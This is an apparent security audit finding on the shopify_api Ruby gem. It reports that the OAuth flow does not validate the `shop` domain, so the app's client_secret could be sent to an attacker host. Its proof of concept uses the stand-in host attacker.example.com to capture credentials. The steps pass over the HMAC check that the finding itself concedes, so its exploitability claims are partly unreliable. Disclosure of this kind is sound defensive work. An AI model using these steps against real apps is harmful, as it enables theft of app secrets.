Confirmed: `ShopValidator.sanitize_shop_domain`/`sanitize!` is used in `token_exchange.rb`, `client_credentials.rb`, and `refresh_token.rb`, but is **not called anywhere in `oauth.rb`**. `Oauth.begin_auth` and `Oauth.validate_auth_callback` both take `shop`/`auth_query.shop` directly from caller-supplied input (typically the OAuth callback query string) and pass it unvalidated into `auth_base_uri(shop)`, which builds `https://#{shop}/admin` and is used as the base path for the POST that carries `Context.api_secret_key` in the body.

### Title
OAuth callback `shop` parameter is not validated against trusted Shopify domains before receiving the app's `client_secret` - (File: `lib/shopify_api/auth/oauth.rb`)

### Summary
`Auth::Oauth.validate_auth_callback` sends `client_id`, `client_secret`, and `code` to a host derived directly from `auth_query.shop` without ever validating that this value is a genuine `*.myshopify.com` (or otherwise trusted) domain via `Utils::ShopValidator`.

### Finding Description
The HMAC on the OAuth callback covers `code`, `host`, `shop`, `state`, and `timestamp` [1](#0-0) , and `validate_auth_callback` does check that HMAC before proceeding [2](#0-1) . However, the HMAC only proves the query was signed by *some* holder of `Context.api_secret_key` for *that exact query string* — it does not restrict `shop` to a `myshopify.com`-family domain. `auth_base_uri(shop)` builds the request target directly from that unvalidated string: `"https://#{shop}/admin"` [3](#0-2) , and `validate_auth_callback` then POSTs `client_secret` (and the OAuth `code`) to that host to exchange for an access token [4](#0-3) .

Elsewhere in the same library, `Utils::ShopValidator.sanitize!`/`sanitize_shop_domain` exists specifically to constrain shop values to `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`) [5](#0-4) , and is applied in `token_exchange.rb`, `client_credentials.rb`, and `refresh_token.rb` before those flows use the shop value to build a request host. `oauth.rb`'s `begin_auth` and `validate_auth_callback` are the exception — neither calls `ShopValidator` on `shop`/`auth_query.shop` before constructing the token-exchange host.

This is the same bug class as the reported off-by-one: a value is trusted to represent a boundary (here, "this is a legitimate Shopify shop domain") without actually being checked against that boundary, so the code's behavior silently diverges from its real precondition. The binding that should hold is:
`host used for the access-token exchange == a domain in ShopValidator::TRUSTED_SHOPIFY_DOMAINS`
but the code instead enforces only:
`HMAC(secret, code+host+shop+state+timestamp) == received hmac`,
which is satisfiable for any attacker-chosen `shop` string as long as the app itself (or a party who can trigger `begin_auth`/receive a callback) supplies matching values — notably, `begin_auth` itself never validates `shop` before using it to build the authorize URL, and if an integrator surfaces `validate_auth_callback` behind a route parameterized by an untrusted `shop` (e.g., re-using it from `begin_auth` state without independent validation), the resulting POST target is attacker-influenced.

### Impact Explanation
If `shop` is not constrained to `*.myshopify.com`/trusted domains before being used to build the OAuth authorize/token-exchange URL, an application built on this gem can be induced to send its `client_id` and `client_secret` to an attacker-controlled host — this is SSRF carrying the app's own `client_secret`, one of the explicitly in-scope "High" impacts (credential leakage of the app's `client_secret` to a non-Shopify host).

### Likelihood Explanation
This requires the host application to pass an attacker-influenced `shop` value into `begin_auth`/`validate_auth_callback` without its own additional validation — which is a documented gem expectation in some flows, but the gem provides `ShopValidator` precisely to remove this burden from integrators in the sibling flows (`token_exchange`, `client_credentials`, `refresh_token`). Its absence specifically in `oauth.rb` is the root-cause inconsistency, and is reachable purely from callback query parameters without needing any pre-existing credential.

### Recommendation
In `Auth::Oauth.begin_auth` and `Auth::Oauth.validate_auth_callback`, call `Utils::ShopValidator.sanitize!(shop, myshopify_domain: Context.host_name)` (or equivalent) on the `shop`/`auth_query.shop` value before it is used to construct `auth_base_uri`, mirroring the validation already performed in `token_exchange.rb`, `client_credentials.rb`, and `refresh_token.rb`.

### Proof of Concept
1. An app built on this gem exposes the standard OAuth begin/callback routes and passes the `shop` query parameter through to `ShopifyAPI::Auth::Oauth.begin_auth`/`validate_auth_callback` (a pattern shown in this gem's own docs, where `shop` originates from request parameters).
2. An attacker requests `/auth?shop=attacker.example.com` (or otherwise causes the callback handler to run with `shop=attacker.example.com`).
3. Because neither `begin_auth` nor `validate_auth_callback` calls `ShopValidator`, `auth_base_uri` builds `https://attacker.example.com/admin` and, on completion of an (attacker-served) fake OAuth code exchange, `validate_auth_callback` POSTs `{client_id, client_secret, code}` to `https://attacker.example.com/admin/oauth/access_token` [4](#0-3) .
4. The attacker's server captures `Context.api_secret_key`, fully compromising the app's `client_secret` for all merchants.
